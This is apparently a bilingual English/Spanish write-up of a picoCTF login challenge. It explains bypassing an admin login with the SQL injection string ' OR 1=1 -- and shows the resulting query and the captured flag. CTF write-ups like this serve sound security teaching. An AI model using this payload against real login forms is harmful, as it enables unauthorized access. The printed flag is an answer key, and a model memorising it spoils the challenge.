## Descripcion
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!

Hay un sitio web funcionando en `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) o http://jupiter.challenges.picoctf.org:33850. ¿Crees que puedes iniciar sesión con nosotros? ¡Intenta ver si puedes iniciar sesión!
### Pistas
1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.

1. No parece haber muchas formas de interactuar con esto. Me pregunto si los usuarios se mantienen en una base de datos.
2. Intente pensar en cómo el sitio web verifica su inicio de sesión.
### Solución
1. Viendo en la página del reto, se puede observar en la parte de "Support" que hay gente diciendo que obtiene un SQL Error, por ende, podemos deducir que esta página usa SQL.
2. Vamos al "Admin Login" y escribimos como el usuario a ' OR 1=1 --
3. Lo que esto hace es verificar si hay un usuario llamado '' (literamente sin nombre) o si no se le manda una condición de 1=1 y lo demás se comenta como tal para ser ignorado.
```
username: ' OR 1=1 --
password: 
SQL query: SELECT * FROM users WHERE name='' OR 1=1 --' AND password=''

# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```
### Notas Adicionales
Para este reto aprendimos a hacer inyecciones a una base de datos desde los campos del sitio, para ello hay que hacer consultas que ya sabemos hacer desde una base de datos.
### Referencias
https://play.picoctf.org/practice/challenge/80
https://jupiter.challenges.picoctf.org/problem/64649/
